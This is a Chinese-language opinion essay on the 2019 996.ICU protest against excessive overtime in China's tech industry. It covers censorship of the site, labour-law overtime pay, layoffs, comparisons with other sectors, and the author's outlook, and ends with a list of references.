该事件发生后，处在舆论的风口浪尖的各大互联网公司几乎都未在第一时间内做出正面回应。微博热搜和知乎热榜被撤。随后，众多国产浏览器开始了屏蔽：QQ 浏览器称这个唯一公开诉求就是让公司遵守劳动法的网站包含欺诈信息。微信显示的理由则是&quot;该网页包含违法或违规内容，为维护绿色上网环境，已停止访问&quot;。阿里的 UC 浏览器和 360 浏览器都将该页面认定为包含违法信息。猎豹浏览器打开这个页面甚至弹出提示&quot;网站含有大量淫秽色情信息&quot;。使用百度搜索 996，中文搜索结果找不到 996.icu 网址和对应 GitHub 仓库。

随后，马云将996 称为修来的福报和刘强东的&quot;兄弟&quot;理论引发众怒，搜狗CEO在微博&quot;有种就快滚&quot;等言论也引起舆论一片哗然。马云当年后悔加班、多陪陪家人的言论也被挖出。在知乎和微博上出现了高达数万赞同的反驳和声讨，其中不乏资本家和阶级斗争等内容。

一批微软和Github员工也在该项目数周之后出于对996.icu项目遭到微软和Github审查压力的担心，在GitHub发起了微软以及GitHub员工支持996项目的请愿书。最初是微软员工在一封内部邮件中呼吁公司抵制潜在的审查压力996.icu项目，因为他担心微软可能会像中国国内的浏览器一样对该项目采取屏蔽、删除或审查。后来该项目在GitHub上得到了众多员工的联名支持。截至目前，该项目已收到数百名员工的实名支持。

### 国内以互联网公司为代表的企业加班情况

根据996.icu相关项目的投票和统计，国内大多数互联网公司存在违反劳动法的严重的加班情况。而据多位老程序员的说法，在十几年前互联网公司和硬件公司加班情况并没有今天这么严重，近年来加班情况愈演愈烈。最早公然违反劳动法鼓吹加班，将这股风气带到整个行业的是华为，从公司成立早期就公然践踏劳动法，让员工签署奋斗者协议，平均加班情况远超９９６，和其他同行业公司进行恶性竞争。而在国内互联网行业，鼓吹加班风气的始作俑者应该是阿里巴巴。 [2014 阿里巴巴怀孕员工加班回家后大出血去世](http://it.sohu.com/20140405/n397797427.shtml)的事件也在当时引起了不少的争议。而在国外，由于完善的法律和相对强势的工会组织，加班情况好于中国。作为互联网发源地的硅谷，大多数巨头公司的员工一天只工作几个小时。而美国的不少公司也在想方设法压榨员工。以工作环境优渥文明的著名公司Google，为员工提供的各种福利，包括免费酒水糕点和休息娱乐设施，其初衷就是为了让员工尽可能长时间留在公司。而有美国富士康之称的亚马逊，加班严重，发生过猝死跳楼等事件，采用高薪和按完成任务情况发工资的方式规避法律，加班时长最高可至８０－１００小时每周，&quot;堪比中国华为&quot;。

而在其他许多传统行业，劳动者的权益相比互联网公司，得到的保障和法律支持以及社会关注更少。相比于互联网的软件开发、测试等岗位，传统制造业工作环境复杂危险，化学药剂、粉尘和爆炸、矿难等安全事故多发，很多劳动者受到伤害难以认定和赔偿，特别是发病时间久的伤害和后遗症（如尘肺病等）难以认定工伤和后续赔偿。最近曝光安全帽问题的工人窦师傅就没有引起比程序员抗议活动更大的关注和报道。再比如建筑行业，大量工地打工的劳动者属于&quot;农民工&quot;，工作和居住条件远不如程序员等行业，而且没有户口也并未缴纳医保等保障金和保险。欠薪和讨薪问题也经常上演。大多数人文化程度和受教育程度低，维权意识差，在信息时代对于网络和媒体的熟悉程度和社会关注度也低于程序员群体。而大部分工程师连夜画图纸是常态，从学生时代起加班加点熬夜画图的风气就成为常态。很多施工单位和设计院的劳动时间远超９９６的加班强度，而相关行业在施工进度和任务上面也有不少企业严重，最典型的当属碧桂园，高周转和赶进度施工不仅对劳动者压榨严重，而且造成多起安全问题，商品房质量堪称业界毒瘤，甚至自己的售楼处都发生了倒塌伤亡事件。

而医生、教师等行业以及不少研究所也都存在着加班的情况，在医疗资源和人力紧缺的部分医院（特别是儿科和航天院所等岗位），值班和加班强度大大超过了劳动法规定的工时，但是却没有应有的待遇，造成了大量的人才流失（甚至一度有&quot;造导弹不如卖茶叶蛋&quot;的谚语流传）。而这些群体和职业，经常将奉献作为典型，宣传无私奉献的精神。但是我们应当意识到，宣扬无私奉献和表彰并不能补偿加班和奉献做出的牺牲，在国家已经度过困难时期的今天，绝不应当将无私奉献的光荣替代实际的报酬和补偿，这对于市场经济按劳分配的原则是极大的破坏。这些在特殊岗位奉献和加班的人们，应当得到实际的物质补偿。

### 加班困局及对策

在西方国家资本原始积累的早期，纺织工人、黑奴、爱尔兰劳工和西部大开发时的铁路劳工都面临着今日程序员同样的压榨困境。一些劳工甚至每天工作16个小时。而现在8小时工作制也不是轻易得来的。1886年5月1日美国芝加哥爆发了历史最大的罢工，也正是以倡导八小时工作制为目标进行的。随着时代的发展，八小时工作制普遍被列为法律条令。当时的工人阶级，实际上在社会上处于相对较高的收入地位，新兴行业的工人也在走在时代的前列，能接触到第一线生产资料和生产力，罢工等运动往往由他们发起。这样的局面和现在的码农颇为类似。

2018年下半年至今，受贸易纠纷禁运制裁和经济形势的影响，国内软硬件公司业绩下滑，开始裁员。很多互联网公司在过去几年的移动互联网风口大肆扩张，在互联网红利结束的今天，开始了裁员和收缩。去年8月，美图、拉勾网各裁员20%。去年12月知乎裁员20%，300人被要求当天离开公司；科大讯飞裁员20%；摩拜裁员30%，称正常调整。今年2月，滴滴裁员15%，2000人离职；京东先裁员20% 员工，2月又裁员10%副总裁级别高管。今年3月腾讯中层裁员10%。但是裁员需要支付较高的离职赔偿金，许多企业通过996、007等高强度的加班方式以及强制外派和出差，逼迫员工主动辞职，试图这个方法省下裁员所需要的补偿费。这样的做法不仅在不规范的小公司盛行，在华为、腾讯等大企业也同样普遍。

在传统制造业，多为流水线作业和重复劳动，因此加班几乎可以带来同加班时间成正比的产出，资本家可以用延长加班时间的方式压榨劳动者的剩余价值。在一些互联网岗位，很多加班并不能带来工作效率和产出的提升，创造性的脑力劳动并不能每天十二个小时稳定产出。

通过各种方式延长加班时间也同样能节省企业雇佣员工的成本，高强度的工作还会逼迫三十至四十岁的老员工离职，企业继续招聘刚毕业的低工资新员工顶替工作。这样不利于公司的技术积累和员工的身体健康，996等加班方式也会造成工作效率低下等严重问题。但是这些对于出于互联网风口的软件公司的重要程度都比不上快速开发带来的利润。而许多年轻员工和刚毕业的实习生都在通过加班的方式试图提高自己的竞争力，甚至形成比拼加班的局面。而在国内整个行业大小公司都开始加班的情况下，不加班的工作越来越少，不愿加班的人也难以找到合适工作。劳动者一盘散沙，没有有效的工会等组织，个人运用法律手段维权时，在面对大公司时很难胜诉。

而许多外包公司会搞高强度的封闭开发，经常一个月无休甚至半年无休。这样的外包项目技术含量更低，工作也近似于流水线和重复劳动，加班相比普通公司更为严重。而员工的福利和待遇也更差，由于工作的技术含量低，可替代能力强，劳动者的议价和反抗能力也更弱。

根据《中华人民共和国劳动法》，超过工作日法定劳动小时的，按照双倍的小时工资支付加班报酬；节假日加班的，按照三倍的小时工资支付加班报酬。以&quot;996&quot;工作制为例，每天早 9 点到岗，一直工作到晚上 9 点，每周工作 6 天&quot;996&quot;工作制的周工作时间为最低 12x6=72 小时，按照劳动法规定，996 工作制下只有拿到当前工资的 2.275 倍，才在经济账上不吃亏。&quot;007&quot;等工作制的每小时收益更低，甚至看起来高收入的互联网行业按照这样的计算方式，每小时平均薪资还会低于其他传统行业。而程序员的岗位多集中在一线二线城市，物价和房价很高，大量员工在距离公司较远的地方租房或者买房，每天上下班通勤时间高达40分钟至1小时。许多人的休息时间不足10小时每天，疲于奔命，不仅难以顾及家庭和身体健康，而且不能学习和技术积累。

由于缺乏有效的抵抗方式，现在对于加班的控诉和反对仅仅集中在网上爆料和讨论，真正敢于抵制和离职的劳动者少之又少。在这次引人注目的事件火热之后，加班仍旧在继续，整个行业并没有发生实质性变化。早年间就曾在阿里巴巴公司带头抵制加班的资深程序员陈皓表示建议通过法律手段、集体抗议、政府信访等手段维权，但是目前鲜有人能做到离职等涉及到实际行动和自身短期利益的抗议，抱怨只停留在口头。

### 可能的解决方案和未来展望

在可见的未来，软硬件行业的利润不会大幅增加，裁员和降薪仍将继续。而前几年并未出现如此大规模的反响和抗议，主要是因为许多新兴公司正处于高速发展期，经过几年的加班甚至有希望实现财务自由。在公司上市发展过程中甚至能获得相当丰厚的股份和分红，从不拥有资本的无产者变成公司的股东。而随着移动互联网红利逐渐到头和大公司的垄断形成，程序员的收入和前景都成了一个问题。当初，阿里公司上市后，员工的股票翻了几倍。而小米 2014 年估值达到450亿美元，等到 2019 年年初员工可以卖股票的时候，小米市值缩水至 315 亿美元，股票价值也比 2014 年缩水 30%。在2018年糟糕的股市中，小米已经是过去一年上市公司里表现很好的。蘑菇街直接以稀释员工股权的手段将员工持股价值缩水为 1/25。这个行业早年有大量的风险投资涌入。互联网公司可以在不盈利的情况下利润可以高薪挖人。但整个 2018 年，中国 VC/PE 募资规模 341.12 亿美元，同比骤降 74.59%。靠烧钱做大规模的互联网公司即便上市也要面对盈利问题。裁员成为一个普遍的做法。

在这种情况下,程序员等劳动群体通过离职、罢工等方式对抗压榨剥削都是不现实的。仅仅通过网上抗议改变不了现状，一部分有能力的技术人员大多选择了外企和出国。这进一步加剧了国内的困境，软硬件行业随着逐渐成熟和垄断的形成，许多岗位变得不再无可替代。随着职位的细分和逐渐稳定的业务，软硬件的各个岗位越来越像富士康的流水线。一方面，互联网给了很多程序员改变命运的机会，另一方面，这样的加班和大城市高昂的房价也直接毁掉了不少人的身体，绝大多数人在40岁后退出。一些发达国家的组织曾谴责一些跨国公司在东南亚和非洲雇佣童工的行为，然而这些童工却在这里获得了比原先更好的生活。类似的问题也发生在中国，富士康历来被称为血汗工厂，但是提供的就业机会和岗位却远好于其他小作坊式的生产车间。在处在转型时期的中国，如何面对这样的选择，是留给每一个劳动者的问题。互联网企业，和整个中国经济一样，已经过了高速发展期，接下来是严格执行法律条约保障劳动者权益共克时艰，抑或是恶性裁员以度过困难， 已经没有调和的余地了。

而小米公司能够给雷军100亿，却以效益不好为由削减员工股份和待遇；京东的刘强东最近所作所为造成公司重大损失，至今安然无恙，底层员工却以&quot;我们不要性价比不高的人&quot;为由被开除，再不是&quot;兄弟&quot;。同样的事情也发生在各行各业，对于劳动者，目前只有&quot;丢掉幻想，准备斗争&quot;。

### 参考文章及网站

1. [ICU/README.md](https://github.com/996icu/996.ICU/blob/5a9758795661b0f38ea4b8f2cb0f015bff91d884/README.md)_. GitHub. 2019-03-30_
2. [996.icu](https://996.icu)
3. [955.WLB](https://github.com/955wlb/955.WLB)
4. [好奇心日报有关报道的备份](https://terminus2049.github.io/archive/2019/04/04/996-ICU.html)
5. [维基百科：996工作制](https://zh.wikipedia.org/wiki/996%E5%B7%A5%E4%BD%9C%E5%88%B6) 
6. --></p>
]]></content>
  </entry>
</search>
